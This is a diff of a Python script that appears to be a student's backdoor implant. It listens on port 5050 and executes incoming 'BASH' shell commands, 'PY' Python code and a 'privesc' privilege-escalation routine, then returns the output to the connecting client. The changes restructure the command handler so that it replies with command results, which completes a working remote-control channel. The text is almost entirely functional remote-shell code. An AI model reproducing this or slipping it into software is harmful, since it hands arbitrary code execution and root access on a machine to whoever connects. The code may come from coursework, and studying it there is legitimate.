@@ -11,7 +11,6 @@ import socket
 import subprocess
 import sys
 import time
-import os
 import contextlib
 import io
 
@@ -25,7 +24,6 @@ def run_command(cmd, shell=True, capture_output=True, **kwargs):
         text=True,
         **kwargs
     )
-
 
 # listen on port 5050, receive input
 HOST, PORT = "0.0.0.0", 5050
@@ -122,22 +120,27 @@ def handle_conn(conn, addr):
 
         #stuff I added -- START
         # Command 1: Privilege Escalation
-        if command_type == "privesc":
-            print("Running privesc")
-            privesc()
-
-        #Command 2: Python 
-        if command_type == "PY":
-            print("Running python")
-            handle_python_command(command_body)
-        
-        if command_type == "BASH":
-            run_command(command_body)
-
+        try: 
+            if command_type == "privesc":
+                print("Running privesc")
+                privesc()
+                conn.sendall(b"Privesc triggered: restarting as root")
+            #Command 2: Python 
+            elif command_type == "PY":
+                print("Running python")
+                result = handle_python_command(command_body)
+                conn.sendall(result.encode("utf-8", errors="replace"))
+            
+            elif command_type == "BASH":
+                result= run_command(command_body)
+                output = result.stdout + result.stderr
+                conn.sendall(output.encode("utf-8", errors="replace"))
+            else: 
+                conn.sendall(f"Unknown command: {command_type}".encode())
         # Think VERY carefully about how you will communicate between the client and server
         # You will need to make a custom protocol to transfer commands
-        try:
-            conn.sendall(run_command("whoami").stdout.encode())
+        # try:
+        #     conn.sendall(run_command("whoami").stdout.encode())
             # Process the communication data from 
         except Exception as e:
             conn.sendall(f"error: {e}".encode())
